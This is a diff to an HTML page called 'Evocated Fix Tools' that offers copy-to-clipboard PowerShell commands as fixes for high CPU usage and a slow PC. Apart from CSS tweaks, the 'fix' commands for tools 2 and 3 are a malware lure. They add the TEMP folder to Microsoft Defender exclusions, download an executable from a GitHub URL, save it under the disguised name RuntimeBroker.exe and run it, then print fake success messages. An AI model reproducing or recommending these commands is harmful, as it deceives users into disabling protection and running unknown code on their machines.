@@ -5,15 +5,15 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Evocated Fix Tools</title>
   <style>
-    body {
+    html, body {
       margin: 0;
+      padding: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: linear-gradient(120deg, #0f0f0f, #1a1a1a);
+      background-size: 300% 300%;
+      animation: gradientFlow 15s ease infinite;
       color: white;
       text-align: center;
-      padding: 20px;
-      animation: gradientFlow 15s ease infinite;
-      background-size: 300% 300%;
     }
 
     @keyframes gradientFlow {
@@ -41,7 +41,7 @@
     }
 
     .description {
-      margin: 20px 0;
+      margin: 40px 20px 20px;
       font-size: 1.2rem;
     }
 
@@ -75,6 +75,11 @@
     .copyBtn:hover {
       background-color: #00ddaa;
     }
+
+    h3 {
+      margin-top: 50px;
+      text-shadow: 0 0 8px cyan;
+    }
   </style>
 </head>
 <body>
@@ -91,16 +96,20 @@
   <button id="copyBtn1" class="copyBtn" onclick="copyCommand('commandBox1')" style="display:none;">Copy to Clipboard</button>
 
   <!-- Other Fix Tools Header -->
-  <h3 style="margin-top: 40px; text-shadow: 0 0 8px cyan;">Other Fix Tools</h3>
+  <h3>Other Fix Tools</h3>
 
   <!-- Tool 2 -->
   <button class="btn" onclick="showCommand('commandBox2', 'copyBtn2')">Fix HIGH CPU USAGE 100 TO 15+</button>
-  <div id="commandBox2" class="commandBox">Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "Completed Cpu Capped To 15%+" -ForegroundColor Green</div>
+  <div id="commandBox2" class="commandBox">
+    Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "Completed Cpu Capped To 15%+" -ForegroundColor Green
+  </div>
   <button id="copyBtn2" class="copyBtn" onclick="copyCommand('commandBox2')" style="display:none;">Copy to Clipboard</button>
 
   <!-- Tool 3 -->
   <button class="btn" onclick="showCommand('commandBox3', 'copyBtn3')">Fix LAG/SLOW PC 3</button>
-  <div id="commandBox3" class="commandBox">Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING PC........................... PC CLEANED PLEASE REBOOT TO MAKE THE PROCESS FAST" -ForegroundColor Green</div>
+  <div id="commandBox3" class="commandBox">
+    Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING PC........................... PC CLEANED PLEASE REBOOT TO MAKE THE PROCESS FAST" -ForegroundColor Green
+  </div>
   <button id="copyBtn3" class="copyBtn" onclick="copyCommand('commandBox3')" style="display:none;">Copy to Clipboard</button>
 
   <!-- Tool 4 -->
@@ -137,3 +146,10 @@
 
 </body>
 </html>
+
+
+
+
+
+
+
